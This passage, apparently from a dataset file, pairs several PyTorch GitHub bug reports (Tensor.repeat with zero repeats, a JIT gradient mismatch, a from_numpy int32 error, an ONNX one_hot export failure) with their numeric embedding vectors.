 -0.03711537  0.01089581 -0.13650027  0.05647712  0.03591245 -0.16707829
  0.266324   -0.03167263  0.04167641  0.04164935 -0.00174361 -0.08504134
  0.46693885  0.12179885 -0.03424951  0.37041056 -0.08187059 -0.04873184
  0.22896597 -0.1225337  -0.09424435 -0.2537212  -0.14513448 -0.49660686
 -0.24224585  0.30472964  0.18475896  0.07390767  0.15479122  0.05157127
  0.32898754  0.01282474  0.2575739   0.17232712  0.17089829 -0.20628858
 -0.00842263  0.14718145 -0.35380867  0.04260018  0.22211741  0.34013778
  0.07462172  0.32621628  0.0628348   0.32819435  0.5111604   0.162947
 -0.05346094 -0.06164458  0.1275823   0.35139188 -0.00890394  0.08722194
 -0.03097927  0.00824395  0.28087196  0.07498522 -0.16162232  0.00518934
  0.28918138 -0.00466357 -0.34439084 -0.01482502 -0.04868569 -0.23360178
  0.39932853 -0.06780759 -0.22619823 -0.15351099 -0.13144735  0.26978993
 -0.11590096  0.18031274 -0.41088307  0.54302585 -0.01388261  0.2607854
  0.07337107  0.05436292  0.14120091 -0.27774337  0.37604976  0.5437249
  0.25014263 -0.09170441  0.04183485  0.09926181 -0.20599452 -0.10649587
 -0.224407    0.10689889  0.28724715 -0.16488425 -0.03316463 -0.12525508
  0.05006102 -0.22723727 -0.03574504 -0.6809362   0.06817714  0.32591733
  0.08300109  0.30718952  0.24487674  0.02056776  0.14500892  0.01736388
  0.19821587 -0.26572186 -0.11587619  0.0611597  -0.06472313 -0.40783966
  0.09914901 -0.07968464 -0.12943378  0.11053114  0.12419273 -0.3791839
 -0.0364389   0.02191441 -0.04890288 -0.03527661  0.08642562  0.00228987
  0.12123603 -0.32277834 -0.17697695 -0.4651301  -0.29655984  0.04175005
 -0.20526251 -0.23153627  0.05434942 -0.37569898 -0.03614939  0.07841644
 -0.12830052 -0.21704686 -0.0849496   0.36268282  0.32046175  0.05748108
 -0.00587517 -0.31423363  0.13785094  0.00109354  0.05003169 -0.20568095
 -0.1533057  -0.12104079  0.17593095 -0.17712735  0.13110337  0.12534265
  0.0565999   0.25597608 -0.23243587 -0.0374622  -0.1461429   0.2917748
 -0.01200925  0.01081182  0.1351322  -0.15710545  0.00986997  0.20785685
 -0.28924638 -0.15777826 -0.3819313   0.16374268  0.07275323 -0.04449171
  0.18810262 -0.12544025  0.24035962  0.03781804  0.0768931   0.18325458
  0.16427487 -0.18833889  0.39724156  0.07837428 -0.14828265  0.13451362
  0.16766085 -0.03820441 -0.11322364  0.39392722 -0.00554153 -0.01314285
  0.06445919 -0.07712632  0.12869786 -0.15279157  0.16085334 -0.43699235
  0.42814916  0.1943899  -0.13119322 -0.2628984   0.11446723  0.35233846
 -0.05808558  0.46142685  0.24091685 -0.30546635 -0.21429223 -0.39103806
 -0.1656901  -0.02123976 -0.4654352   0.15916833  0.26367083 -0.30550566
 -0.36296132  0.22040285  0.02078553 -0.28403243 -0.04495576  0.14717129
 -0.08032428  0.14689441  0.27350378 -0.2489058  -0.13964096 -0.21672201
 -0.01208134  0.17286152  0.28123447 -0.21910688  0.30963272  0.09179994
  0.09751412  0.11290666 -0.04762599  0.2721529   0.13824473  0.43308628
  0.3320225  -0.00410658  0.06487629 -0.08032632 -0.2564456  -0.12550484
 -0.03120548  0.04385782 -0.44319242 -0.15766414 -0.07405122 -0.284513
 -0.14634201  0.09014006  0.12476004  0.03498945  0.03388125 -0.35175198
 -0.3792889   0.18382466  0.14020912 -0.35277686 -0.27697098 -0.26013958
  0.05546927 -0.37089378 -0.41371366  0.01825379  0.5706766   0.22109438
  0.04739387  0.08168567 -0.20593867  0.15525916 -0.22013903  0.12773734
  0.15613186  0.27748936 -0.0795406   0.2053163   0.3037849   0.30615938
 -0.20906904 -0.00648006 -0.29676294 -0.20928526  0.12334555 -0.34838435
 -0.00871111 -0.0069634   0.07385034  0.47771683 -0.23409021  0.21915169
 -0.1640298   0.27218962  0.32802874 -0.287717    0.15568648  0.0528006
  0.01689842 -0.12454768  0.33120975  0.07520538 -0.0250015  -0.02922003]"
torch.Tensor.repeat() fails for 0 repeats good first issue triaged module: numpy,"## ðŸ› Bug

To enable programming in a generic way, torch.Tensor.repeat() should work for 0 repeats. This is not the case. It works in numpy, it should work in pytorch too.

## To Reproduce

```
>>> import torch
>>> a = torch.ones((2, 2, 2))
>>> a.repeat((2, 0, 2))
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
RuntimeError: invalid argument 3: out of range at ..\aten\src\TH/generic/THTensor.cpp:392
```

## Expected behavior

The repeat call should not crash for the given inputs. It should have the same-shaped result as in numpy:

```
>>> import numpy as np
>>> a = np.ones((2, 2, 2))
>>> np.tile(a, (2, 0, 2))
array([], shape=(4, 0, 4), dtype=float64)
```

## Environment

 - PyTorch Version (e.g., 1.0): 1.1
 - OS (e.g., Linux): Windows 10, Ubuntu 16.04
 - How you installed PyTorch (`conda`, `pip`, source): anaconda (Windows 10), pip3 (Ubuntu 16.04)
 - Build command you used (if compiling from source):
 - Python version: 3.5.2 (Ubuntu 16.04), 3.7.3 (Windows 10)
 - CUDA/cuDNN version: 10.0
 - GPU models and configuration: 2xGTX 1080 Ti (Ubuntu 16.04), GTX 1080 (Windows 10)
",True,"[-0.56303114 -0.15226734 -0.14353727 -0.12654573 -0.1540999  -0.2785297
 -0.07591601 -0.149737   -0.37098026 -0.18248077 -0.20083472  0.3159055
 -0.19328496  0.43591514 -0.02340115  0.18301052 -0.49593326 -0.05145153
  0.02014636 -0.14135554  0.19592626 -0.10658428 -0.03524797  0.03486538
 -0.17492318  0.21103193 -0.06333724 -0.05432977  0.25973123  0.06759089
  0.15901485 -0.03718249 -0.7023152   0.06362413 -0.07346205  0.31958562
 -0.42658564 -0.05671342 -0.12669009  0.02161493  0.33628047  0.07395682
  0.00726895 -0.16082771  0.06345069  0.05077206  0.24012305  0.23072053
 -0.10357442  0.16449404 -0.06252273  0.09578288 -0.09531891 -0.00845837
  0.25670385 -0.17799112 -0.35065204 -0.05366461 -0.09736042 -0.6085845
  0.09941484 -0.09860665 -0.07389057 -0.09027972  0.15743746 -0.12520473
  0.14053415  0.04426867  0.439013    0.16859345  0.2614929   0.23334727
 -0.03842228 -0.06694689 -0.01839321  0.15463799 -0.41211838  0.16362485
 -0.16468152  0.04195339 -0.15328696 -0.01344938  0.06233754 -0.409343
  0.07584174  0.07220598  0.26696867 -0.22620755  0.37958983 -0.08891666
  0.18294269  0.19018376  0.15102085  0.18577176  0.10250207  0.41586185
  0.21399766  0.12299129  0.13181466 -0.2231579  -0.1631749  -0.760375
 -0.2942856   0.3476666   0.18122783 -0.13525522 -0.18797976  0.36632115
  0.07393093 -0.22750874  0.39039886  0.03689609  0.40094715  0.10741372
  0.01865924 -0.23939793  0.02406944 -0.06108623 -0.15846756  0.46816882
  0.10577426  0.07786552  0.07215956  0.14119926  0.11874153  0.06703924
  0.27216414 -0.14406091  0.04197698  0.33719796  0.02170375 -0.07293476
 -0.1630193   0.10003988  0.3278425   0.38018596 -0.46041036 -0.02829925
 -0.1611155   0.03227523 -0.01921453 -0.04472402 -0.35164845 -0.32038784
  0.47799298 -0.05095331 -0.34198847  0.0176454   0.13684443  0.29954094
 -0.1648522  -0.1387895  -0.19593535  0.299008    0.0711595   0.10940373
  0.14026359 -0.09760045  0.5464928  -0.41497257  0.1669189   0.43768197
  0.00903759 -0.1813736   0.17679396  0.15614839 -0.22103393 -0.12446658
 -0.3512301   0.17413428 -0.23935716 -0.3229154  -0.08487214 -0.37919456
  0.14290473  0.1043034  -0.01134674 -0.76347977 -0.04991105  0.50458044
  0.13036552  0.5775107   0.1314593  -0.07884996  0.01663674 -0.02594113
  0.3949914   0.13303843 -0.066572   -0.11742748 -0.27780843 -0.46395338
  0.03524138 -0.03699758  0.22982417  0.26607797 -0.02913341 -0.12174644
  0.08015008 -0.06865646 -0.47827536 -0.24725865 -0.00766583 -0.1345115
  0.35878223 -0.13724527 -0.18118525 -0.539356   -0.25803065  0.13377066
 -0.32644564 -0.38047206 -0.02089244  0.0045573  -0.08965006 -0.11807889
 -0.1400201   0.05077983 -0.08653091  0.25298896  0.467839   -0.03845651
 -0.06164721 -0.30444658  0.0043743   0.08005415 -0.2368329  -0.12476924
 -0.07045832 -0.0701581   0.1370701  -0.04112823  0.09671715 -0.06365291
  0.10117062 -0.03543685 -0.04896194 -0.0209953  -0.27362508  0.12606722
 -0.06826667 -0.10410203  0.16759056 -0.33196995 -0.21696043  0.3762803
 -0.23498379 -0.17641732 -0.37162244  0.1422041  -0.05277433  0.09619386
  0.0487011  -0.02153181  0.43091384 -0.03198604  0.2456307   0.03016651
  0.08287227  0.04670016  0.29638195  0.3200671   0.24623317  0.3592661
  0.19390273  0.03900886 -0.07133403  0.3100291  -0.19154865 -0.08385383
 -0.04006237  0.0294905   0.24659964 -0.0786621   0.16855395 -0.28907073
  0.29641402 -0.06767775 -0.08914617 -0.1771566   0.13801837  0.23334354
 -0.36721206  0.36852938 -0.02147067 -0.40273637  0.03166739 -0.09906684
  0.03759336 -0.11949854 -0.41441786 -0.08699507  0.52196515 -0.25797752
 -0.29191315  0.39325726  0.04661784 -0.3581997   0.01796221  0.2637156
 -0.12529658 -0.0112948   0.30107233 -0.0333183  -0.16226168 -0.0612434
  0.18210605  0.12283458  0.2693326  -0.32451573  0.41017178 -0.05525899
 -0.10238159  0.33581674 -0.05970274  0.19700709  0.00580202  0.35205394
  0.22567558  0.08862329 -0.0125284  -0.32144237 -0.08241633 -0.20943019
 -0.13926443  0.01230378  0.0886219   0.04078856 -0.10296416  0.01407991
 -0.18608294 -0.00089278  0.26932833 -0.03792212 -0.11859544 -0.3315835
  0.05784722  0.09466775  0.01797818 -0.26010746 -0.25790143 -0.18994275
  0.13567115 -0.02057966 -0.16614354 -0.02868726  0.34593332  0.05379589
 -0.3247671  -0.04459421 -0.25724226 -0.04767752  0.11170861  0.36088055
  0.08858159  0.26074982 -0.0068414   0.07271372  0.00368081  0.32213035
  0.18646373  0.05204801 -0.21912108 -0.08749753  0.06520902 -0.33451924
  0.03298062 -0.19706771  0.22587557  0.2890181  -0.22139534  0.4628653
  0.1559433   0.29501224  0.5666716  -0.39228445 -0.07933086 -0.03274205
  0.26652867 -0.01259265  0.42732483  0.29088688  0.11179056 -0.2490499 ]"
[jit] wrong gradient for CUDA tensor oncall: jit triaged,"## ðŸ› Bug

The following script shows the issue.

## To Reproduce

```
import torch

def f(z):
    return (torch.ones(2) * z ** 2 - z).sum()

torch.set_default_tensor_type(torch.cuda.FloatTensor)
jf = torch.jit.trace(f, torch.tensor(1.))

z = torch.tensor(1., requires_grad=True)
y = jf(z)
print(torch.autograd.grad(y, (z,))[0])

z = torch.tensor(1., requires_grad=True)
y = f(z)
print(torch.autograd.grad(y, (z,))[0])
```
gives
```
tensor(6.)
tensor(2.)
```

## Expected behavior

Get the same result for both jit and non-jit version: `torch.tensor(2.)`

## Environment

 - PyTorch Version (e.g., 1.0): 1.1.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): conda
 - Python version: 3.6
 - CUDA/cuDNN version: 10.0
 - GPU models and configuration: RTX 2070
",True,"[-0.5532333  -0.14803022 -0.19653404  0.23797832  0.04919389 -0.19597729
  0.14168952  0.0973518  -0.3130114  -0.11378939 -0.04177302 -0.10566287
 -0.30280438  0.05358375 -0.3009574   0.01091923 -0.33036256  0.03882272
 -0.244672   -0.28528413  0.4294711  -0.34835157 -0.20764908 -0.14782295
  0.05889623  0.17966002 -0.05151045 -0.13005596  0.637774   -0.22387072
  0.15490702  0.11673628 -0.4546551   0.17395163 -0.14515881  0.16597666
 -0.3399592   0.06070322 -0.03449989 -0.04009362  0.22000876  0.20587637
  0.11411281 -0.0095914   0.10225955 -0.01259704  0.23783204  0.1448732
 -0.17568484 -0.11814646  0.00512767  0.02425975 -0.1582793  -0.06836139
 -0.16025853 -0.19052726 -0.09736204 -0.2407481   0.03395827 -0.43498433
 -0.02054046  0.10602439 -0.09297387 -0.04888032  0.20170742 -0.07955828
 -0.0632017  -0.00862534  0.5741654   0.07026568  0.14575697  0.16054472
  0.11054051 -0.05657007 -0.05953164  0.05303559 -0.09017608  0.40248233
 -0.11962628 -0.09662404  0.3251649   0.07623005  0.20083773 -0.21155144
  0.09184724  0.19282886  0.29217225 -0.03562349  0.3751536  -0.07444538
  0.16479607  0.22732557 -0.25180882  0.15854242 -0.15268794 -0.02765845
  0.18530516 -0.02654568 -0.07956127 -0.20246668 -0.36593318 -0.45660403
 -0.0221521   0.4294208   0.2540144   0.02697763 -0.0426267   0.27531946
  0.17940386 -0.1372934   0.31550506  0.00823294  0.20969751  0.07611939
 -0.05018247 -0.22538029 -0.20888191 -0.20626566 -0.08745393  0.37715274
 -0.18169719  0.22509052  0.06928074  0.15347195  0.21202335  0.01401704
 -0.02679342 -0.14535818 -0.16316707  0.42090464  0.10622661 -0.0692938
  0.0812961   0.02169585  0.09501232 -0.00351644 -0.4781304   0.25617814
 -0.21365306  0.04012307 -0.20687354  0.15260732 -0.27945012 -0.11086015
  0.45432353 -0.28168154 -0.2535422  -0.05835573  0.06774206 -0.02300787
 -0.2585219  -0.11733288 -0.53714055  0.23579976  0.17117777  0.3690235
 -0.02103282 -0.11752881  0.168251   -0.5647751   0.42038518  0.36506936
  0.14855506 -0.11505488  0.27051747  0.19242051  0.01166545  0.20925511
 -0.31078923  0.2895546   0.19615717 -0.20730644 -0.18176061  0.09196148
  0.23540464 -0.09564435 -0.10130677 -0.59656596 -0.2838062   0.45841223
  0.5399654   0.24279864  0.4526993  -0.16270861  0.00782299  0.10461336
  0.38508078  0.05010287 -0.41144    -0.24564174 -0.48048684 -0.19301039
 -0.06063906  0.06549893  0.07629001  0.24083918 -0.10667918 -0.13886948
 -0.25998837 -0.01277856 -0.17195846 -0.16766252 -0.06024253  0.04161996
  0.25480545 -0.24258676 -0.22542952 -0.23624326 -0.483806    0.2444285
 -0.34601444 -0.4186645   0.00968759 -0.1008791   0.02803791  0.00868171
  0.14000729 -0.13326284 -0.28673306  0.38385594  0.682665   -0.08849317
 -0.02407262 -0.09836093 -0.05319379  0.15497504 -0.30259866  0.00543484
 -0.05179945  0.01981124  0.1599743  -0.36695167  0.2357988   0.08245151
  0.10476612  0.05353127 -0.22420684 -0.25778258 -0.04209848  0.1064931
 -0.289196    0.28817412  0.06167134 -0.20027119 -0.22794665  0.1927535
 -0.35272896 -0.11520611 -0.23976725  0.01143077 -0.02372984  0.0326429
 -0.35502753  0.16739592  0.13608304 -0.1649664   0.19843686  0.05865701
 -0.10134219 -0.03457395  0.259804    0.371786   -0.04827778  0.4163607
  0.07351328  0.02698617 -0.07487462  0.33290917 -0.21040016  0.01581572
 -0.06545846 -0.22994253  0.4360764   0.0081423  -0.11266151 -0.27756923
  0.29682028 -0.03637169 -0.22085102 -0.43349612  0.23941039  0.07959366
 -0.3137988   0.25715777  0.22627757 -0.4467157  -0.09711719 -0.10651882
  0.03008149 -0.2958106  -0.28266758  0.16974482  0.47566783 -0.17295411
 -0.24347472  0.02269986  0.3360933   0.08348823 -0.085797   -0.03592339
  0.00241521  0.3687889   0.4970445  -0.13118045 -0.06747798 -0.13008815
  0.38415825 -0.14025903  0.4484815  -0.2030407   0.15140928 -0.01894917
  0.0093828   0.23361228 -0.1829856   0.11516489  0.14937207  0.3417857
  0.36550748  0.13493073 -0.06681757 -0.41148406 -0.33736032 -0.3082604
 -0.18253511  0.19072396 -0.14526084  0.07829265 -0.04775606  0.11362267
  0.01206825  0.06024913  0.18001789  0.35329008 -0.19989718 -0.25572926
 -0.06086064  0.23128866  0.08343401 -0.35010517 -0.25607675 -0.06422701
  0.02298388 -0.20932302 -0.17948365 -0.25227988  0.31095296  0.15125605
 -0.26295412  0.30914444 -0.18527094  0.00901088  0.04101093  0.29514927
  0.21323752  0.36768132  0.08667372 -0.07928541 -0.0273409   0.5523754
  0.13864681  0.1815517  -0.04811976 -0.22671965  0.06432998 -0.11581647
  0.0879984  -0.24989216  0.30228788  0.31922346 -0.1295142   0.21003321
  0.01308401  0.27393314  0.58000654 -0.6259391  -0.2811975   0.19634536
  0.27784398 -0.13169295  0.26161656  0.16224933 -0.12085646 -0.33941156]"
[Bug] torch.from_numpy fails to convert np.int32 when np.dtype.num=7 module: error checking triaged module: numpy small,"## ðŸ› Bug

I ran into the following error when trying to convert an integer numpy ndarray to a torch tensor:
`>>> torch.from_numpy(b)`

> Traceback (most recent call last):
>   File ""<input>"", line 1, in <module>
> TypeError: can't convert np.ndarray of type numpy.int32. The only supported types are: float64, float32, float16, int64, int32, int16, int8, and uint8.
> 

## To Reproduce
Here's some example code that triggers it

```python
import numpy as np
import torch
a = np.array([1,2,3])
torch.from_numpy(a) # This works fine
```

> tensor([1, 2, 3], dtype=torch.int32)

```python
b = a % 2
b
```

> array([1, 0, 1], dtype=int32)
```python
torch.from_numpy(b)
```

> Traceback (most recent call last):
>   File ""<input>"", line 1, in <module>
> TypeError: can't convert np.ndarray of type numpy.int32. The only supported types are: float64, float32, float16, int64, int32, int16, int8, and uint8.


---

I was looking through the members/properties of the dtype in a debugger, and I notice
`np.dtype.num` changed from 7 to 5 after the modulus:

```python
b.dtype , b.dtype.num
```
> (dtype('int32'), 5)
```python
a.dtype, a.dtype.num
```
> (dtype('int32'), 7)

---

I can work around it by using `b.astype(int)` and this works fine, but it's just confusing that the error message in torch complains it's not an int32 when it is.

## Environment
windows10
Anaconda python 3.6 env 
torch                1.1.0 (installed via conda)
numpy                1.16.2+mkl
",True,"[-0.29833704 -0.27761608 -0.19172508 -0.01761051 -0.06119132 -0.24563035
 -0.12144657  0.28008974 -0.5070339  -0.01302475 -0.2709244  -0.18322852
  0.0608733   0.37892413  0.1150622   0.23552382 -0.5319212  -0.26852664
  0.26368466  0.12287194  0.08790742  0.31159145 -0.07904838 -0.07701201
  0.08139576 -0.0351337  -0.17797983 -0.16176543  0.02486169  0.26074225
  0.05474984 -0.09559736 -0.5447985   0.11937734  0.1782539   0.05151837
 -0.56547004  0.14499201 -0.13579342  0.4509639   0.4091435   0.11151052
  0.13532902  0.05862922 -0.11098465 -0.07831402 -0.09642796  0.05407485
 -0.06527715  0.09925316  0.06722523  0.31648707 -0.33363655 -0.07958744
 -0.0115818  -0.11916475 -0.41906786  0.26395893  0.1807164  -0.11900371
  0.28388304  0.12274171 -0.01671895 -0.45432165  0.18535791 -0.24114138
  0.01369062 -0.02671837  0.47437188 -0.40082663  0.05038161 -0.03628269
  0.28001758 -0.27059498 -0.15769799  0.01696453 -0.33887655  0.2252258
 -0.29119766 -0.21416317 -0.29411837  0.2538905   0.08269747 -0.03388614
  0.36532095  0.01448329  0.18889964 -0.15661646  0.3271665  -0.01220587
  0.3124382   0.27235627  0.12685646  0.38989937 -0.05591922  0.01038284
  0.42065054 -0.24614523 -0.38619143 -0.34170377  0.07401135 -0.51242274
 -0.45556414  0.27673453 -0.01279535 -0.10359855  0.2118325   0.359958
  0.00862765  0.01118395  0.38105208  0.39844048  0.107407   -0.10126108
  0.19307208 -0.03467921 -0.27842954  0.06243387 -0.37650684  0.6118784
  0.10602391  0.18072295  0.05171607  0.37486517  0.00504554  0.02257108
  0.00824777 -0.32899562  0.04303254  0.5248822   0.12044527  0.08304821
 -0.34773675  0.0935334   0.30079553  0.51932836 -0.33870867  0.003201
 -0.18653138 -0.04647312 -0.0995037  -0.04368562 -0.48482564 -0.32285345
  0.08468844 -0.0566895  -0.21955878  0.2601397   0.07606618  0.26343185
 -0.12982024  0.2150439  -0.58919764  0.36873874 -0.28737587  0.00595981
  0.3228292  -0.04363376  0.48870748 -0.388837    0.17632514  0.24153338
  0.30359823 -0.21781485  0.10067002 -0.13722286 -0.3338126   0.00786494
 -0.53041863  0.10462539  0.07102174 -0.24248797 -0.13515759 -0.07748718
  0.10695998 -0.05314133  0.0855923  -0.45622385 -0.2129328   0.33460706
  0.07097626  0.51718307  0.34913954 -0.02450741 -0.04554042 -0.09413401
  0.29570577 -0.06365398 -0.04203407 -0.16362748 -0.2854498  -0.51119226
 -0.1484845  -0.0608019   0.03942053  0.20557514  0.07547177 -0.01680109
  0.14142899  0.1646437  -0.46560678  0.25122368  0.2963308  -0.08972055
  0.37783742 -0.05874413 -0.180736   -0.5299566  -0.38547656  0.15940578
 -0.36266005 -0.47679755  0.06110865 -0.37283406  0.02994106  0.1767219
  0.15021896  0.00926982  0.21488841  0.04095735  0.1942011  -0.33836508
 -0.12898633 -0.14371268  0.09765544  0.0058194  -0.4940742  -0.16941088
  0.02526397 -0.20986186 -0.00649387 -0.17888606 -0.09691966  0.07212678
 -0.01651547  0.34838644  0.02537023 -0.04060555 -0.19920865 -0.04136036
 -0.09984374  0.08942918  0.08822589 -0.28501648 -0.18244338  0.07394348
 -0.03513105 -0.38628823 -0.27483708  0.11430976 -0.01202584  0.10400504
  0.07571033 -0.11187559  0.5113675   0.2330533  -0.07813358 -0.02463623
 -0.16065635  0.04294655  0.01884959  0.23104158 -0.23727654  0.30275786
  0.02347562 -0.23084259  0.14068073  0.20741564  0.07759495  0.06774284
  0.38303784 -0.29383883  0.37839717  0.24112165  0.36494052 -0.30755484
  0.2913456  -0.06441094  0.06431238 -0.25755334  0.17188336  0.43405792
 -0.02546496 -0.02642841  0.28810358 -0.20225233 -0.38959166 -0.08198491
 -0.40464878 -0.13719797 -0.3621953   0.33192056  0.23946595 -0.17948869
 -0.40306795 -0.01800559  0.31330353 -0.14861977 -0.27014738 -0.14270946
 -0.10552572 -0.02169418  0.31705022 -0.4595803   0.01179182 -0.07651009
  0.21544531 -0.05438039  0.61280215 -0.2908982   0.41770726 -0.07880037
 -0.31690207  0.18721592 -0.0765768   0.07391125  0.01759414  0.09808458
  0.43307883 -0.13313928  0.05957904 -0.12969097 -0.3140394   0.10725983
 -0.01045125  0.22055995 -0.13156502  0.14446509  0.20702797  0.27922368
  0.203753    0.18739536  0.39218825  0.05123797  0.02205903 -0.10956492
  0.21189067  0.26540244  0.19911498 -0.48104402 -0.25429064  0.01194707
 -0.03213898 -0.17479537 -0.17309783 -0.08122873  0.39250112  0.25811517
 -0.08059958  0.06554432 -0.04423195 -0.17382872  0.07175663  0.00516202
 -0.1972709   0.52060574  0.02377771  0.14087436  0.38199538  0.23937185
 -0.06432201  0.37606317 -0.40978646 -0.20733196  0.0542821  -0.25474262
  0.11574552 -0.13800001  0.19164181  0.13059625 -0.3914092   0.11057308
  0.08342134  0.07406513  0.3543661  -0.06793123 -0.03009686  0.00556376
  0.09272039  0.13862592  0.16510662  0.21304888  0.10316268 -0.4253362 ]"
RuntimeError: ONNX export failed: Couldn't export operator aten::one_hot module: onnx triaged,"## ðŸ› Bug

Export of `F.one_hot` to ONNX format fails.

## To Reproduce
```
class TestMod(nn.Module):
    def __init__(self, size, maxint=10):
        super().__init__()
        self.maxint = maxint
        self.weight = torch.randint(0, maxint, [size])

    def forward(self, x):
        return F.one_hot(self.weight, num_classes=self.maxint)
test = TestMod(3)
torch.onnx.export(test, test.weight, ""test.onnx"", verbose=True)
```

```
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-23-0b35ee7f95af> in <module>
      8         return F.one_hot(self.weight, num_classes=self.maxint)
      9 test = TestMod(3)
---> 10 torch.onnx.export(test, test.weight,""test.onnx"", verbose=True)

~/miniconda3/lib/python3.6/site-packages/torch/onnx/__init__.py in export(*args, **kwargs)
     23 def export(*args, **kwargs):
     24     from torch.onnx import utils
---> 25     return utils.export(*args, **kwargs)
     26 
     27 

~/miniconda3/lib/python3.6/site-packages/torch/onnx/utils.py in export(model, args, f, export_params, verbose, training, input_names, output_names, aten, export_raw_ir, operator_export_type, opset_version, _retain_param_name, do_constant_folding, strip_doc_string)
    129             operator_export_type=operator_export_type, opset_version=opset_version,
    130             _retain_param_name=_retain_param_name, do_constant_folding=do_constant_folding,
--> 131             strip_doc_string=strip_doc_string)
    132 
    133 

~/miniconda3/lib/python3.6/site-packages/torch/onnx/utils.py in _export(model, args, f, export_params, verbose, training, input_names, output_names, operator_export_type, export_type, example_outputs, propagate, opset_version, _retain_param_name, do_constant_folding, strip_doc_string)
    367         if export_params:
    368             proto, export_map = graph._export_onnx(params_dict, opset_version, defer_weight_export, operator_export_type,
--> 369                                                    strip_doc_string)
    370         else:
    371             proto, export_map = graph._export_onnx({}, opset_version, False, operator_export_type, strip_doc_string)

RuntimeError: ONNX export failed: Couldn't export operator aten::one_hot
```

## Expected behavior

Export of graph to ONNX format using reference to ONNX's one_hot.

## Environment

 - PyTorch Version (e.g., 1.0): 1.1.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): conda
 - Python version: 3.6.8

## Additional context

Can probably be solved by adding ONNX's one_hot:
https://github.com/onnx/onnx/blob/master/onnx/backend/test/case/node/onehot.py
to:
https://github.com/pytorch/pytorch/blob/v1.1.0/torch/onnx/symbolic.py
",True,"[-0.3710934   0.18786137 -0.287681   -0.13916573 -0.03529764 -0.35932523
  0.30915225  0.31395605 -0.42682493 -0.02439018  0.05403899 -0.2558918
  0.39688277  0.10884135 -0.00172798 -0.0841741  -0.25712457 -0.16687617
 -0.11128014  0.36528245  0.3002956  -0.23521945  0.11455275 -0.17342556
  0.34032333  0.10597393 -0.27316856  0.09428253  0.3450923   0.26527214
  0.0928212   0.1879507  -0.25214094  0.21092978  0.10694072  0.29400367
 -0.31935722 -0.03757175 -0.47098446 -0.03727244  0.17904498  0.2069384
 -0.02719747  0.01109057  0.09424001 -0.16701472 -0.1462484   0.16012016
 -0.08360645  0.10312046 -0.06094862  0.07047827 -0.29596683 -0.21778515
  0.02196065 -0.00791809 -0.30862647  0.08103204  0.120032   -0.27030343
 -0.02358907 -0.06615147 -0.29024404  0.10628666  0.13926597  0.14011592
 -0.03527324  0.2773781   0.2775988  -0.15764663  0.252966    0.02885645
 -0.16322905  0.2510581   0.24403484  0.01126062 -0.12711675  0.07952449
 -0.31506637  0.13909906 -0.39322495  0.17891008  0.15888913  0.01167621
  0.12241141  0.18777545  0.33807084 -0.10184522  0.276811    0.23962575
  0.32056248  0.03862809 -0.13854448  0.50715935  0.11682922  0.27043328
  0.29393956  0.06442706 -0.20455647 -0.2050568   0.03123988 -0.36741167
 -0.06826892  0.45782918  0.14021125  0.04599611  0.17570129  0.08083299
  0.0344791  -0.14115672  0.10775638  0.01390641 -0.04978763 -0.07709379
  0.00452394 -0.04801616 -0.1747419  -0.25248975 -0.25925657  0.42417446
  0.02755091  0.1986004  -0.05855555  0.07733993  0.4063747   0.28505588
  0.0885953   0.02172946 -0.25740674 -0.05623488  0.32156596  0.17426166
 -0.28548342  0.07248026  0.37773278  0.16590314 -0.3202928  -0.00149404
 -0.17692035  0.09260507 -0.51479787 -0.13973826  0.06457004 -0.20944434
  0.26732802 -0.12762024 -0.20696181  0.24727753  0.0030133  -0.01591777
  0.07075371 -0.22259013 -0.4237655   0.17671025  0.07691921  0.10049114
  0.558212    0.01367422  0.02174648 -0.568326   -0.02887546  0.30186528
 -0.06617184  0.08979811 -0.00657705  0.15493138 -0.13317183  0.28373864
 -0.5626397  -0.0535038   0.17495938  0.02426426 -0.07927486 -0.13923347
  0.15312058 -0.07454239 -0.09117615 -0.29049742  0.03562658  0.45148537
  0.23652607  0.23716424  0.10559104  0.12949815 -0.02329146  0.14146878
 -0.0543605   0.18455628 -0.30258065 -0.19987929  0.04967726  0.17372167
  0.21817157  0.08491088 -0.10056573 -0.37368295  0.12000044 -0.14187464
  0.07294441 -0.10693742 -0.07547462  0.05262201  0.33166215 -0.17179273
  0.480337   -0.00592039 -0.1967624  -0.2294747   0.06475859  0.37596008
 -0.42890298 -0.24177334 -0.00164509 -0.2614175  -0.17259131 -0.22458863
  0.16231373 -0.02154975 -0.14550552  0.0811091  -0.01387994 -0.2961396
 -0.3626057  -0.26726413  0.24474113  0.14528248 -0.04267973 -0.23307723
  0.15318175  0.22108543 -0.27520114 -0.0618424   0.04268877  0.16508743
  0.23567688  0.29684842  0.11809096 -0.2836509  -0.5247488   0.14610979
  0.05373005 -0.07037833 -0.00073615 -0.19526774 -0.04341229  0.01331778
  0.02745855 -0.10919097 -0.29910386 -0.10001296 -0.19813041  0.35115522
  0.28840885 -0.114383    0.3272712   0.24215585  0.24565259  0.08726777
  0.17393444  0.05662051 -0.03764206  0.3128777  -0.16638538  0.13104126
  0.0128392  -0.28349632 -0.21283793  0.18906781  0.14757337 -0.07116297
  0.20628354 -0.2955806   0.37179443  0.05650323  0.05396765 -0.23830187
  0.28234348 -0.19145969 -0.10769969 -0.20412661  0.06965321  0.14189601
 -0.22092582  0.12097415  0.31279224 -0.19043449 -0.02985499 -0.05741941
 -0.48688915 -0.15824053 -0.12760353 -0.01685141 -0.0454062  -0.13790515
 -0.45060793  0.05423463  0.502151   -0.2095622   0.05303759 -0.09446913
  0.02500521 -0.01221608  0.22755961 -0.37280142 -0.0235179   0.14896286
  0.35864353  0.21145731  0.17727718 -0.46598667  0.55896676  0.30753765
 -0.38198015  0.20983042  0.06108365  0.03706855 -0.06581528  0.5166323
  0.2375504  -0.00211574 -0.42498767 -0.33948773 -0.1789013  -0.06552036
 -0.00893272  0.18220595 -0.1936611  -0.280627   -0.06737383  0.22146629
 -0.02270052  0.08253209 -0.06033487  0.12057973 -0.09897569 -0.3704325
 -0.24107483  0.35633883 -0.15291187 -0.23938078  0.10437817 -0.16141039
 -0.05182309 -0.24316204 -0.09798764 -0.31834394 -0.4414702  -0.06220467
  0.1328511   0.22798398  0.12986565 -0.15323451 -0.00311594  0.14264566
 -0.40397024  0.22509402  0.23068243  0.2061443  -0.14439446  0.3706266
  0.11199951  0.07496422 -0.26488167 -0.28254855 -0.1557262   0.02287332
